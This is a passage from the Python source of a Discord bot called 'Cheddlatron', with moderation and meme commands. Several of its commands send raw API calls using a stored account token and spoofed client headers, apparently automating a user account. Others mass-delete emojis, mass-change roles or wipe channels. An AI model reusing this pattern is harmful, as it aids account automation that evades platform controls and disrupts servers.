            print(f"{Fore.LIGHTRED_EX}[ERROR] {Fore.WHITE}You don't have the necessary permissions to create emojis in the destination server.")
            break
        except discord.HTTPException:
            print(f"{Fore.LIGHTRED_EX}[ERROR] {Fore.WHITE}An error occurred while trying to create the emoji {emoji.name}.")
    if len(destination_server.emojis) >= emoji_limit:
        pass
    else:
        heading = "Import Emojis"
        body = "Emoji Successfully Imported!"
        cmdname = "importemojis"
        await panelmaker(ctx, heading, body, cmdname)

@Cheddlatron.command(description=f"Deletes all emojis in a server. \nUsage: {config_get('prefix')}delemojis", help="moderation") 
async def delemojis(ctx):    
    if not ctx.guild.me.guild_permissions.manage_emojis:
        print(f"{Fore.LIGHTRED_EX}[ERROR] {Fore.WHITE}You don't have the necessary permissions to manage emojis.")
        return
    emojis = ctx.guild.emojis
    if not emojis:
        print(f"{Fore.LIGHTRED_EX}[ERROR] {Fore.WHITE}There are no emojis to delete.")
        return
    for emoji in emojis:
        try:
            await emoji.delete()
        except discord.Forbidden:
            print(f"{Fore.LIGHTRED_EX}[ERROR] {Fore.WHITE}Unable to delete emoji {emoji.name}. You don't have the necessary permissions.")
            break
        except discord.HTTPException:
            print(f"{Fore.LIGHTRED_EX}[ERROR] {Fore.WHITE}An error occurred while trying to delete emoji {emoji.name}.")
    heading = "Delete Emojis"
    body = "All emojis have been deleted!"
    cmdname = "delemoji"
    await panelmaker(ctx, heading, body, cmdname)

@Cheddlatron.command(description=f"Exports all bans from a server and stores them in a txt. \nUsage: {config_get('prefix')}exportbans", help="moderation")
async def exportbans(ctx):    
    ban_info = ""
    bans = await ctx.guild.bans()
    for entry in bans:
        ban_info += f"{entry.user} - {entry.reason}\n"
    if ban_info:
        with open(f"Data//Dumps//Ban Lists//{ctx.guild.name}'s ban list.txt", "w", encoding="utf-8") as file:
            file.write(ban_info)
        heading = "Export Bans"
        body = f"Ban information saved to '{ctx.guild.name}'s ban list.txt"
        cmdname = "exportbans"
        await panelmaker(ctx, heading, body, cmdname)
    else:
        heading = "Export Bans"
        body = f"No Bans Were Found."
        cmdname = "exportbans"
        await panelmaker(ctx, heading, body, cmdname)

@Cheddlatron.command(description=f"Sends a list of all bans in chat. \nUsage: {config_get('prefix')}listbans", help="moderation")
async def listbans(ctx):
    ban_info = ""
    bans = await ctx.guild.bans()

    for entry in bans:
        ban_info += f"User: {entry.user.name} Reason: {entry.reason}\n"

        if len(ban_info) >= 1800 and config_get('embed_mode') == "indent":
            heading = f"{ctx.guild.name}'s Ban List "
            body = ban_info
            cmdname = "listbans"
            await panelmaker(ctx, heading, body, cmdname)
            ban_info = ""

        elif config_get('embed_mode') == "web" and len(ban_info) >= 150:
            heading = f"{ctx.guild.name}'s Ban List "
            body = ban_info
            cmdname = "listbans"
            await panelmaker(ctx, heading, body, cmdname)
            ban_info = ""

    ban_info = ban_info.rstrip('\n')

    if ban_info:
        heading = f"{ctx.guild.name}'s Ban List "
        body = ban_info
        cmdname = "listbans"
        await panelmaker(ctx, heading, body, cmdname)
    else:
        heading = "List Bans"
        body = "No Bans Were Found"
        cmdname = "listbans"
        await panelmaker(ctx, heading, body, cmdname)

@Cheddlatron.command(description=f"Bans a user from a server with their Discord ID. \nUsage: {config_get('prefix')}idban <user id> [reason]", help="moderation")
async def idban(ctx, member_id: int, *, reason=None):
    if reason is None:
        reason = "Cheddlatron"
    await ctx.guild.ban(discord.Object(id=member_id), reason=reason)
    heading = "ID Ban"
    body = f"{member_id} was banned for {reason}."
    cmdname = "idban"
    await panelmaker(ctx, heading, body, cmdname)

@Cheddlatron.command(description=f"Bans and then unbans a user from a server with their Discord ID. \nUsage: {config_get('prefix')}softidban <user id> [reason]", help="moderation")
async def softidban(ctx, member_id: int, *, reason=None):
    if reason is None:
        reason = "Cheddlatron"
    await ctx.guild.ban(discord.Object(id=member_id), reason=reason)
    await ctx.guild.unban(discord.Object(id=member_id), reason=reason)
    heading = "Soft ID Ban"
    body = f"{member_id} was softbanned for {reason}."
    cmdname = "softidban"
    await panelmaker(ctx, heading, body, cmdname)

@Cheddlatron.command(description=f"Bans and then unbans a user from a server. \nUsage: {config_get('prefix')}softban <@user> [reason]", help="moderation")
async def softban(ctx, user: discord.Member, *, reason=None):
    if reason is None:
        reason = "Cheddlatron"
    await user.ban(reason=reason)
    await user.unban(reason=reason)
    heading = "Soft Ban"
    body = f"{user} was softbanned for {reason}."
    cmdname = "softban"
    await panelmaker(ctx, heading, body, cmdname)

@Cheddlatron.command(description=f"Removes a role from a user. \nUsage: {config_get('prefix')}removerole <@user> <role name>", help="moderation")
async def removerole(ctx, member: discord.Member, *, name):
    role = get(ctx.guild.roles, name=name)
    await member.remove_roles(role)
    heading = "Role Removal"
    body = f"{member} was removed from the role {name}."
    cmdname = "removerole"
    await panelmaker(ctx, heading, body, cmdname)

@Cheddlatron.command(description=f"Creates a stage channel. \nUsage: {config_get('prefix')}makechannel <channel name>", help="moderation") 
async def makestage(ctx, *, name):    
    await ctx.guild.create_stage_channel(name)

@Cheddlatron.command(description=f"Bans a user from a server. \nUsage: {config_get('prefix')}ban <@user> [reason]", help="moderation")
async def ban(ctx, user: discord.Member, *, reason=None):
    if reason is None:
        reason = "Cheddlatron"
    await user.ban(reason=reason)
    heading = "Ban"
    body = f"{user} was banned for {reason}."
    cmdname = "ban"
    await panelmaker(ctx, heading, body, cmdname)

@Cheddlatron.command(description=f"Creates a role. \nUsage: {config_get('prefix')}makerole <name>", help="moderation")
async def makerole(ctx, *, role):
    await ctx.guild.create_role(name=role)
    heading = "Role Creation"
    body = f"{role} was created."
    cmdname = "makerole"
    await panelmaker(ctx, heading, body, cmdname)

@Cheddlatron.command(description=f"Gives a specific user a role. \nUsage: {config_get('prefix')}giverole <@user> <role name>", help="moderation")
async def giverole(ctx, member: discord.Member, *, name):
    role = get(ctx.guild.roles, name=name)
    await member.add_roles(role)
    heading = "Role Assignment"
    body = f"{member} was given the role {name}."
    cmdname = "giverole"
    await panelmaker(ctx, heading, body, cmdname)

@Cheddlatron.command(description=f"Gives all members in a server a role. \nUsage: {config_get('prefix')}roleall <role name>", help="moderation")
async def roleall(ctx, *, name):
    role = get(ctx.guild.roles, name=name)
    for member in list(ctx.guild.members):
        try:
            await member.add_roles(role)
        except:
            print(Exception)
    heading = "Role Assignment to All"
    body = f"All members were given the role: {name}."
    cmdname = "roleall"
    await panelmaker(ctx, heading, body, cmdname)

@Cheddlatron.command(description=f"Removes a role from all members in a server. \nUsage: {config_get('prefix')}unroleall <role name>", help="moderation")
async def unroleall(ctx, *, name):
    role = get(ctx.guild.roles, name=name)
    for member in list(ctx.guild.members):
        try:
            await member.remove_roles(role)
        except:
            print(Exception)
    heading = "Role Removal from All"
    body = f"{name} role was taken from all members."
    cmdname = "unroleall"
    await panelmaker(ctx, heading, body, cmdname)

@Cheddlatron.command(description=f"Changes a user's nickname. \nUsage: {config_get('prefix')}nick <@user> <nickname>", help="moderation")
async def nick(ctx, member: discord.Member, *, nick):   
    await member.edit(nick=nick)

@Cheddlatron.command(description=f"Gets rid of a user's nickname. \nUsage: {config_get('prefix')}clearnick <@user>", help="moderation")
async def clearnick(ctx, user: discord.Member):    
    await user.edit(nick=None)

@Cheddlatron.command(description=f"Kicks a user from a server. \nUsage: {config_get('prefix')}kick <@user>", help="moderation")
async def kick(ctx, user: discord.Member):   
    await user.kick(reason="Cheddlatron")
    heading = "Kick"
    body = f"{user} was kicked."
    cmdname = "kick"
    await panelmaker(ctx, heading, body, cmdname)

@Cheddlatron.command(description=f"Mutes a user in a server. \nUsage: {config_get('prefix')}mute <@user>", help="moderation")
async def mute(ctx, user: discord.Member):    
    role = discord.utils.get(ctx.guild.roles, name="Muted")
    if not role:
        role = await ctx.guild.create_role(name="Muted", permissions=discord.Permissions(send_messages=False))
    await user.add_roles(role)
    heading = "Mute"
    body = f"{user} was muted."
    cmdname = "mute"
    await panelmaker(ctx, heading, body, cmdname)

@Cheddlatron.command(description=f"Unmutes a user in a server. \nUsage: {config_get('prefix')}unmute <@user>", help="moderation")
async def unmute(ctx, user: discord.Member):    
    role = discord.utils.get(ctx.guild.roles, name="Muted")
    await user.remove_roles(role)
    heading = "Unmute"
    body = f"{user} was unmuted."
    cmdname = "unmute"
    await panelmaker(ctx, heading, body, cmdname)

@Cheddlatron.command(description=f"Makes a channel in a server. \nUsage: {config_get('prefix')}makechannel <channel name>", help="moderation")
async def makechannel(ctx, *, name):    
    await ctx.guild.create_text_channel(name)

@Cheddlatron.command(description=f"Makes a voice channel in a server. \nUsage: {config_get('prefix')}makevc <channel name>", help="moderation")
async def makevc(ctx, *, name):    
    await ctx.guild.create_voice_channel(name)

@Cheddlatron.command(description=f"Makes a category in a server. \nUsage: {config_get('prefix')}makecategory <category name>", help="moderation")
async def makecategory(ctx, *, name):    
    await ctx.guild.create_category_channel(name)

@Cheddlatron.command(description=f"Deletes a category. \nUsage: {config_get('prefix')}delcategory <#category-tag>", help="moderation")
async def delcategory(ctx, channel: discord.CategoryChannel):    
    await channel.delete()

@Cheddlatron.command(description=f"Renames a category. \nUsage: {config_get('prefix')}renamecategory <#category-tag> <channel name>", help="moderation")
async def renamecategory(ctx, channel: discord.CategoryChannel, *, name):    
    await channel.edit(name=name)

@Cheddlatron.command(description=f"Deletes a channel in a server. \nUsage: {config_get('prefix')}delchannel <#channel-tag>", help="moderation")
async def delchannel(ctx, channel: discord.TextChannel):    
    await channel.delete()

@Cheddlatron.command(description=f"Deletes a voice channel. \nUsage: {config_get('prefix')}delvc <#vc-tag>", help="moderation")
async def delvc(ctx, channel: discord.VoiceChannel):    
    await channel.delete()

@Cheddlatron.command(description=f"Renames a voice channel. \nUsage: {config_get('prefix')}renamevc <#vc-tag> <channel name>", help="moderation")
async def renamevc(ctx, channel: discord.VoiceChannel, *, name):    
    await channel.edit(name=name)

@Cheddlatron.command(description=f"Renames a channel in a server. \nUsage: {config_get('prefix')}renamechannel <#channel-tag> <channel name>", help="moderation")
async def renamechannel(ctx, channel: discord.TextChannel, *, name):    
    await channel.edit(name=name)

@Cheddlatron.command(description=f"Puts slowmode on in a server. \nUsage: {config_get('prefix')}slowmode [slowmode length (seconds)]", help="moderation")
async def slowmode(ctx, time=60):    
    await ctx.channel.edit(slowmode_delay=time)

@Cheddlatron.command(description=f"Turns off slowmode in a server. \nUsage: {config_get('prefix')}removeslowmode", help="moderation")
async def removeslowmode(ctx):    
    await ctx.channel.edit(slowmode_delay=0)

@Cheddlatron.command(description=f"Untimes out users in a server in mass. \nUsage: {config_get('prefix')}masstimeout", help="moderation") 
async def massuntimeout(ctx): 
    users = scrape(ctx.guild.id, ctx.guild.member_count)  
    for user in users:
        headers = {'authorization': config_get('token'), 'x-super-properties': getxsuper(), "Content-Type": "application/json"}   
        date = (datetime.utcnow().strftime('%Y-%m-%d'))
        data = f'{{"communication_disabled_until":"{date}T00:00:00.000Z"}}'
        response = requested.patch(f'https://discordapp.com/api/v9/guilds/{ctx.guild.id}/members/{user.id}', headers=headers, data=data)    
        if response.status_code == 403:
            print(f"{Fore.LIGHTRED_EX}[ERROR]: {Fore.WHITE}Failed To Untimeout {user.name} In {ctx.guild.name}")
            await send_webhook("Mass Untimeout Error", f"Failed to untimetime out {user.name} In {ctx.guild.name}.", config_get('error_webhook_url'))
        elif response.status_code == 200:
            pass
    heading = "Mass Untimeout"
    body = "Successfully untimed out everyone."
    cmdname = "massuntimeout"
    await panelmaker(ctx, heading, body, cmdname)

@Cheddlatron.command(description=f"Times out a user. \nUsage: {config_get('prefix')}timeout <@use> [timeout time (mins)]", help="moderation") 
async def timeout(ctx, user: discord.Member, time_minutes: int=60):    
    if time_minutes > 10080:
        heading = "Error"
        body = "You cannot set a timeout longer than 7 days."
        cmdname = "ERROR"
        await panelmaker(ctx, heading, body, cmdname)
        return
    hours = time_minutes // 60
    minutes = time_minutes % 60
    timeout_datetime = datetime.utcnow() + timedelta(hours=hours, minutes=minutes)
    timeout_str = timeout_datetime.strftime('%Y-%m-%dT%H:%M:%S.999Z')
    headers = {'authorization': config_get('token'), 'x-super-properties': getxsuper(), "Content-Type": "application/json"}   
    data = f'{{"communication_disabled_until":"{timeout_str}"}}'
    response = requested.patch(f'https://discordapp.com/api/v9/guilds/{ctx.guild.id}/members/{user.id}', headers=headers, data=data)   
    if response.status_code == 403:
        print(f"{Fore.LIGHTRED_EX}[ERROR]: {Fore.WHITE}Failed To Timeout {user.name} In {ctx.guild.name}")
        await send_webhook("Timeout Error", f"Failed to timeout {user.name} In {ctx.guild.name}.", config_get('error_webhook_url'))
    elif response.status_code == 200:
        heading = "Timeout"
        body = f"{user} was timed out for {hours} hours and {minutes} minutes."
        cmdname = "timeout"
        await panelmaker(ctx, heading, body, cmdname)

@Cheddlatron.command(description=f"Untimes out a user in a server. \nUsage: {config_get('prefix')}untimeout <@user>", help="moderation") 
async def untimeout(ctx, user: discord.Member):   
    headers = {'x-super-properties': getxsuper(), 'authorization': config_get('token'), "Content-Type": "application/json"}   
    date = (datetime.utcnow().strftime('%Y-%m-%d'))
    data = f'{{"communication_disabled_until":"{date}T00:00:00.000Z"}}'
    response = requested.patch(f'https://discordapp.com/api/v9/guilds/{ctx.guild.id}/members/{user.id}', headers=headers, data=data)    
    if response.status_code == 403:
        print(f"{Fore.LIGHTRED_EX}[ERROR]: {Fore.WHITE}Failed To Untimeout {user.name} In {ctx.guild.name}")
        await send_webhook("Untimeout Error", f"Failed to untimetime out {user.name} In {ctx.guild.name}.", config_get('error_webhook_url'))
    elif response.status_code == 200:
        heading = "Untimeout"
        body = f"{user} was untimed out."
        cmdname = "untimeout"
        await panelmaker(ctx, heading, body, cmdname)

@Cheddlatron.command(description=f"Unbans a user from a server using their ID. \nUsage: {config_get('prefix')}idunban <user id> [reason]", help="moderation") 
async def idunban(ctx, member_id: int, *, reason=None):   
    if reason == None:
        reason = "Cheddlatron"
    await ctx.guild.unban(discord.Object(id=member_id), reason=reason)
    heading = "ID Unban"
    body = f"{member_id} was unbanned."
    cmdname = "idunban"
    await panelmaker(ctx, heading, body, cmdname)

@Cheddlatron.command(description=f"Deletes and remakes a channel to wipe it of its contents. \nUsage: {config_get('prefix')}nukechannel", help="moderation")
async def nukechannel(ctx):
    channel = ctx.channel
    perms = ctx.channel.overwrites
    position = channel.position
    await channel.delete()
    await ctx.guild.create_text_channel(name=str(channel), help=channel.category, overwrites=perms, position=position)
#MODERATION COMMANDS------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


#MEME COMMANDS------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
@Cheddlatron.command(description=f"Creates an ancient aliens guy meme. \nUsage: {config_get('prefix')}aliensguy [text 1] [text 2]", help="meme")
async def aliensguy(ctx, text1: str=None, text2: str=None):    
    if text1 == None or text1 == "":
        text1 = "-"
    elif text2 == None or text2 == "":
        text2 = "-"
    await ctx.send(urlif(f"https://api.memegen.link/images/aag/{text1}/{text2}.png"))

@Cheddlatron.command(description=f"Creates an 'ain't got no time for that' meme. \nUsage: {config_get('prefix')}aintgottime [text 1] [text 2]", help="meme")
async def aintgottime(ctx, text1: str=None, text2: str=None):    
    if text1 == None or text1 == "":
        text1 = "-"
    elif text2 == None or text2 == "":
        text2 = "-"
    await ctx.send(urlif(f"https://api.memegen.link/images/aint-got-time/{text1}/{text2}.png"))
    
@Cheddlatron.command(description=f"Creates a seal meme. \nUsage: {config_get('prefix')}seal [text 1] [text 2]", help="meme")
async def seal(ctx, text1: str=None, text2: str=None):    
    if text1 == None or text1 == "":
        text1 = "-"
    elif text2 == None or text2 == "":
        text2 = "-"
    await ctx.send(urlif(f"https://api.memegen.link/images/ams/{text1}/{text2}.png"))

@Cheddlatron.command(description=f"Creates a red penguin meme. \nUsage: {config_get('prefix')}redpenguin [text 1] [text 2]", help="meme")
async def redpenguin(ctx, text1: str=None, text2: str=None):    
    if text1 == None or text1 == "":
        text1 = "-"
    elif text2 == None or text2 == "":
        text2 = "-"
    await ctx.send(urlif(f"https://api.memegen.link/images/awesome/{text1}/{text2}.png"))

@Cheddlatron.command(description=f"Creates a blue penguin meme. \nUsage: {config_get('prefix')}bluepenguin [text 1] [text 2]", help="meme")
async def bluepenguin(ctx, text1: str=None, text2: str=None):    
    if text1 == None or text1 == "":
        text1 = "-"
    elif text2 == None or text2 == "":
        text2 = "-"
    await ctx.send(urlif(f"https://api.memegen.link/images/awkward/{text1}/{text2}.png"))

@Cheddlatron.command(description=f"Creates a bad milk meme. \nUsage: {config_get('prefix')}badmilk [text 1] [text 2]", help="meme")
async def badmilk(ctx, text1: str=None, text2: str=None):   
    if text1 == None or text1 == "":
        text1 = "-"
    elif text2 == None or text2 == "":
        text2 = "-"
    await ctx.send(urlif(f"https://api.memegen.link/images/badchoice/{text1}/{text2}.png"))

@Cheddlatron.command(description=f"Creates a Discord mod meme. \nUsage: {config_get('prefix')}discordmod [text 1] [text 2]", help="meme")
async def discordmod(ctx, text1: str=None, text2: str=None):    
    if text1 == None or text1 == "":
        text1 = "-"
    elif text2 == None or text2 == "":
        text2 = "-"
    await ctx.send(urlif(f"https://api.memegen.link/images/bd/{text1}/{text2}.png"))

@Cheddlatron.command(description=f"Creates a bender meme. \nUsage: {config_get('prefix')}bender [text 1] [text 2]", help="meme")
async def bender(ctx, text1: str=None, text2: str=None):    
    if text1 == None or text1 == "":
        text1 = "-"
    elif text2 == None or text2 == "":
        text2 = "-"
    await ctx.send(urlif(f"https://api.memegen.link/images/bender/{text1}/{text2}.png"))

@Cheddlatron.command(description=f"Creates a farmer meme. \nUsage: {config_get('prefix')}farmer [text 1] [text 2]", help="meme")
async def farmer(ctx, text1: str=None, text2: str=None):    
    if text1 == None or text1 == "":
        text1 = "-"
    elif text2 == None or text2 == "":
        text2 = "-"
    await ctx.send(urlif(f"https://api.memegen.link/images/bihw/{text1}/{text2}.png"))

@Cheddlatron.command(description=f"Creates a ginger meme. \nUsage: {config_get('prefix')}ginger [text 1] [text 2]", help="meme")
async def ginger(ctx, text1: str=None, text2: str=None):    
    if text1 == None or text1 == "":
        text1 = "-"
    elif text2 == None or text2 == "":
        text2 = "-"
    await ctx.send(urlif(f"https://api.memegen.link/images/blb/{text1}/{text2}.png"))

@Cheddlatron.command(description=f"Creates a suitcat meme. \nUsage: {config_get('prefix')}suitcat [text 1] [text 2]", help="meme")
async def suitcat(ctx, text1: str=None, text2: str=None):    
    if text1 == None or text1 == "":
        text1 = "-"
    elif text2 == None or text2 == "":
        text2 = "-"
    await ctx.send(urlif(f"https://api.memegen.link/images/boat/{text1}/{text2}.png"))

@Cheddlatron.command(description=f"Creates a bullshark meme. \nUsage: {config_get('prefix')}bullshark [text 1] [text 2]", help="meme")
async def bullshark(ctx, text1: str=None, text2: str=None):   
    if text1 == None or text1 == "":
        text1 = "-"
    elif text2 == None or text2 == "":
        text2 = "-"
    await ctx.send(urlif(f"https://api.memegen.link/images/bs/{text1}/{text2}.png"))

@Cheddlatron.command(description=f"Creates a Buzz Lightyear meme. \nUsage: {config_get('prefix')}buzz [text 1] [text 2]", help="meme")
async def buzz(ctx, text1: str=None, text2: str=None):    
    if text1 == None or text1 == "":
        text1 = "-"
    elif text2 == None or text2 == "":
        text2 = "-"
    await ctx.send(urlif(f"https://api.memegen.link/images/buzz/{text1}/{text2}.png"))

@Cheddlatron.command(description=f"Creates a bear meme. \nUsage: {config_get('prefix')}bear [text 1] [text 2]", help="meme")
async def bear(ctx, text1: str=None, text2: str=None):    
    if text1 == None or text1 == "":
        text1 = "-"
    elif text2 == None or text2 == "":
        text2 = "-"
    await ctx.send(urlif(f"https://api.memegen.link/images/cb/{text1}/{text2}.png"))

@Cheddlatron.command(description=f"Creates a comic book guy meme. \nUsage: {config_get('prefix')}comicbookguy [text 1] [text 2]", help="meme")
async def comicbookguy(ctx, text1: str=None, text2: str=None):    
    if text1 == None or text1 == "":
        text1 = "-"
    elif text2 == None or text2 == "":
        text2 = "-"
    await ctx.send(urlif(f"https://api.memegen.link/images/cbg/{text1}/{text2}.png"))

@Cheddlatron.command(description=f"Creates a cheems meme. \nUsage: {config_get('prefix')}cheems [text 1] [text 2]", help="meme")
async def cheems(ctx, text1: str=None, text2: str=None):    
    if text1 == None or text1 == "":
        text1 = "-"
    elif text2 == None or text2 == "":
        text2 = "-"
    await ctx.send(urlif(f"https://api.memegen.link/images/cheems/{text1}/{text2}.png"))

@Cheddlatron.command(description=f"Creates a chosen one meme. \nUsage: {config_get('prefix')}chosenone [text 1] [text 2]", help="meme")
async def chosenone(ctx, text1: str=None, text2: str=None):    
    if text1 == None or text1 == "":
        text1 = "-"
    elif text2 == None or text2 == "":
        text2 = "-"
    await ctx.send(urlif(f"https://api.memegen.link/images/chosen/{text1}/{text2}.png"))

@Cheddlatron.command(description=f"Creates a change my mind meme. \nUsage: {config_get('prefix')}changemymind [text 1] [text 2]", help="meme")
async def changemymind(ctx, text1: str=None, text2: str=None):    
    if text1 == None or text1 == "":
        text1 = "-"
    elif text2 == None or text2 == "":
        text2 = "-"
    await ctx.send(urlif(f"https://api.memegen.link/images/cmm/{text1}/{text2}.png"))

@Cheddlatron.command(description=f"Creates a crying on the floor meme. \nUsage: {config_get('prefix')}cryingonfloor [text 1] [text 2]", help="meme")
async def cryingonfloor(ctx, text1: str=None, text2: str=None):   
    if text1 == None or text1 == "":
        text1 = "-"
    elif text2 == None or text2 == "":
        text2 = "-"
    await ctx.send(urlif(f"https://api.memegen.link/images/cryingfloor/{text1}/{text2}.png"))

@Cheddlatron.command(description=f"Creates a distracted boyfriend meme. \nUsage: {config_get('prefix')}distractedbf [text 1] [text 2]", help="meme")
async def distractedbf(ctx, text1: str=None, text2: str=None):    
    if text1 == None or text1 == "":
        text1 = "-"
    elif text2 == None or text2 == "":
        text2 = "-"
    await ctx.send(urlif(f"https://api.memegen.link/images/db/{text1}/{text2}.png"))

@Cheddlatron.command(description=f"Creates a distracted girlfriend meme. \nUsage: {config_get('prefix')}distractedgf [text 1] [text 2]", help="meme")
async def distractedgf(ctx, text1: str=None, text2: str=None):    
    if text1 == None or text1 == "":
        text1 = "-"
    elif text2 == None or text2 == "":
        text2 = "-"
    await ctx.send(urlif(f"https://api.memegen.link/images/dg/{text1}/{text2}.png"))

@Cheddlatron.command(description=f"Creates a disaster girl meme. \nUsage: {config_get('prefix')}disastergirl [text 1] [text 2]", help="meme")
async def disastergirl(ctx, text1: str=None, text2: str=None):    
    if text1 == None or text1 == "":
        text1 = "-"
    elif text2 == None or text2 == "":
        text2 = "-"
    await ctx.send(urlif(f"https://api.memegen.link/images/disastergirl/{text1}/{text2}.png"))

@Cheddlatron.command(description=f"Creates a Doge meme. \nUsage: {config_get('prefix')}doge [text 1] [text 2]", help="meme")
async def doge(ctx, text1: str=None, text2: str=None):    
    if text1 == None or text1 == "":
        text1 = "-"
    elif text2 == None or text2 == "":
        text2 = "-"
    await ctx.send(urlif(f"https://api.memegen.link/images/doge/{text1}/{text2}.png"))

@Cheddlatron.command(description=f"Creates a drunk baby meme. \nUsage: {config_get('prefix')}drunkbaby [text 1] [text 2]", help="meme")
async def drunkbaby(ctx, text1: str=None, text2: str=None):   
    if text1 == None or text1 == "":
        text1 = "-"
    elif text2 == None or text2 == "":
        text2 = "-"
    await ctx.send(urlif(f"https://api.memegen.link/images/drunk/{text1}/{text2}.png"))

@Cheddlatron.command(description=f"Creates a Dwight meme. \nUsage: {config_get('prefix')}dwight [text 1] [text 2]", help="meme")
async def dwight(ctx, text1: str=None, text2: str=None):    
    if text1 == None or text1 == "":
        text1 = "-"
    elif text2 == None or text2 == "":
        text2 = "-"
    await ctx.send(urlif(f"https://api.memegen.link/images/dwight/{text1}/{text2}.png"))

@Cheddlatron.command(description=f"Creates an elf meme. \nUsage: {config_get('prefix')}elf [text 1] [text 2]", help="meme")
async def elf(ctx, text1: str=None, text2: str=None):    
    if text1 == None or text1 == "":
        text1 = "-"
    elif text2 == None or text2 == "":
        text2 = "-"
    await ctx.send(urlif(f"https://api.memegen.link/images/elf/{text1}/{text2}.png"))

@Cheddlatron.command(description=f"Creates an exit meme. \nUsage: {config_get('prefix')}exit [text 1] [text 2]", help="meme")
async def exit(ctx, text1: str=None, text2: str=None):    
    if text1 == None or text1 == "":
        text1 = "-"
    elif text2 == None or text2 == "":
        text2 = "-"
    await ctx.send(urlif(f"https://api.memegen.link/images/exit/{text1}/{text2}.png"))

@Cheddlatron.command(description=f"Creates a forever alone meme. \nUsage: {config_get('prefix')}foreveralone [text 1] [text 2]", help="meme")
async def foreveralone(ctx, text1: str=None, text2: str=None):   
    if text1 == None or text1 == "":
        text1 = "-"
    elif text2 == None or text2 == "":
        text2 = "-"
    await ctx.send(urlif(f"https://api.memegen.link/images/fa/{text1}/{text2}.png"))

@Cheddlatron.command(description=f"Creates a facepalm meme. \nUsage: {config_get('prefix')}facepalm [text 1] [text 2]", help="meme")
async def facepalm(ctx, text1: str=None, text2: str=None):    
    if text1 == None or text1 == "":
        text1 = "-"
    elif text2 == None or text2 == "":
        text2 = "-"
    await ctx.send(urlif(f"https://api.memegen.link/images/facepalm/{text1}/{text2}.png"))

@Cheddlatron.command(description=f"Creates a this is fine meme. \nUsage: {config_get('prefix')}thisisfine [text 1] [text 2]", help="meme")
async def thisisfine(ctx, text1: str=None, text2: str=None):    
    if text1 == None or text1 == "":
        text1 = "-"
    elif text2 == None or text2 == "":
        text2 = "-"
    await ctx.send(urlif(f"https://api.memegen.link/images/fine/{text1}/{text2}.png"))

@Cheddlatron.command(description=f"Creates a Futurama Fry meme. \nUsage: {config_get('prefix')}futuramafry [text 1] [text 2]", help="meme")
async def futuramafry(ctx, text1: str=None, text2: str=None):    
    if text1 == None or text1 == "":
        text1 = "-"
    elif text2 == None or text2 == "":
        text2 = "-"
    await ctx.send(urlif(f"https://api.memegen.link/images/fry/{text1}/{text2}.png"))

@Cheddlatron.command(description=f"Creates a grinds my gears meme. \nUsage: {config_get('prefix')}grindsmygears [text 1] [text 2]", help="meme")
async def grindsmygears(ctx, text1: str=None, text2: str=None):    
    if text1 == None or text1 == "":
        text1 = "-"
    elif text2 == None or text2 == "":
        text2 = "-"
    await ctx.send(urlif(f"https://api.memegen.link/images/gears/{text1}/{text2}.png"))

@Cheddlatron.command(description=f"Creates a grumpy cat meme. \nUsage: {config_get('prefix')}grumpycat [text 1] [text 2]", help="meme")
async def grumpycat(ctx, text1: str=None, text2: str=None):    
    if text1 == None or text1 == "":
        text1 = "-"
    elif text2 == None or text2 == "":
        text2 = "-"
    await ctx.send(urlif(f"https://api.memegen.link/images/grumpycat/{text1}/{text2}.png"))

@Cheddlatron.command(description=f"Creates a Hagrid meme. \nUsage: {config_get('prefix')}hagrid [text 1] [text 2]", help="meme")
async def hagrid(ctx, text1: str=None, text2: str=None):    
    if text1 == None or text1 == "":
        text1 = "-"
    elif text2 == None or text2 == "":
        text2 = "-"
    await ctx.send(urlif(f"https://api.memegen.link/images/hagrid/{text1}/{text2}.png"))

@Cheddlatron.command(description=f"Creates a Harold meme. \nUsage: {config_get('prefix')}harold [text 1] [text 2]", help="meme")
async def harold(ctx, text1: str=None, text2: str=None):    
    if text1 == None or text1 == "":
        text1 = "-"
    elif text2 == None or text2 == "":
        text2 = "-"
    await ctx.send(urlif(f"https://api.memegen.link/images/harold/{text1}/{text2}.png"))

@Cheddlatron.command(description=f"Creates a headaches meme. \nUsage: {config_get('prefix')}headaches [text 1] [text 2]", help="meme")
async def headaches(ctx, text1: str=None, text2: str=None):    
    if text1 == None or text1 == "":
        text1 = "-"
    elif text2 == None or text2 == "":
        text2 = "-"
    await ctx.send(urlif(f"https://api.memegen.link/images/headaches/{text1}/{text2}.png"))

@Cheddlatron.command(description=f"Creates an 'I Can Has Cat' meme. \nUsage: {config_get('prefix')}icanhascat [text 1] [text 2]", help="meme")
async def icanhascat(ctx, text1: str=None, text2: str=None):    
    if text1 == None or text1 == "":
        text1 = "-"
    elif text2 == None or text2 == "":
        text2 = "-"
    await ctx.send(urlif(f"https://api.memegen.link/images/icanhas/{text1}/{text2}.png"))

@Cheddlatron.command(description=f"Creates a jetpack meme. \nUsage: {config_get('prefix')}jetpack [text 1] [text 2]", help="meme")
async def jetpack(ctx, text1: str=None, text2: str=None):    
    if text1 == None or text1 == "":
        text1 = "-"
    elif text2 == None or text2 == "":
        text2 = "-"
    await ctx.send(urlif(f"https://api.memegen.link/images/jetpack/{text1}/{text2}.png"))

@Cheddlatron.command(description=f"Creates a Joker meme. \nUsage: {config_get('prefix')}joker [text 1] [text 2]", help="meme")
async def joker(ctx, text1: str=None, text2: str=None):    
    if text1 == None or text1 == "":
        text1 = "-"
    elif text2 == None or text2 == "":
        text2 = "-"
    await ctx.send(urlif(f"https://api.memegen.link/images/joker/{text1}/{text2}.png"))

@Cheddlatron.command(description=f"Creates a Kermit meme. \nUsage: {config_get('prefix')}kermit [text 1] [text 2]", help="meme")
async def kermit(ctx, text1: str=None, text2: str=None):    
    if text1 == None or text1 == "":
        text1 = "-"
    elif text2 == None or text2 == "":
        text2 = "-"
    await ctx.send(urlif(f"https://api.memegen.link/images/kermit/{text1}/{text2}.png"))

@Cheddlatron.command(description=f"Creates a lizard meme. \nUsage: {config_get('prefix')}lizard [text 1] [text 2]", help="meme")
async def lizard(ctx, text1: str=None, text2: str=None):    
    if text1 == None or text1 == "":
        text1 = "-"
    elif text2 == None or text2 == "":
        text2 = "-"
    await ctx.send(urlif(f"https://api.memegen.link/images/ll/{text1}/{text2}.png"))

@Cheddlatron.command(description=f"Creates a shocked meme. \nUsage: {config_get('prefix')}shocked [text 1] [text 2]", help="meme")
async def shocked(ctx, text1: str=None, text2: str=None):    
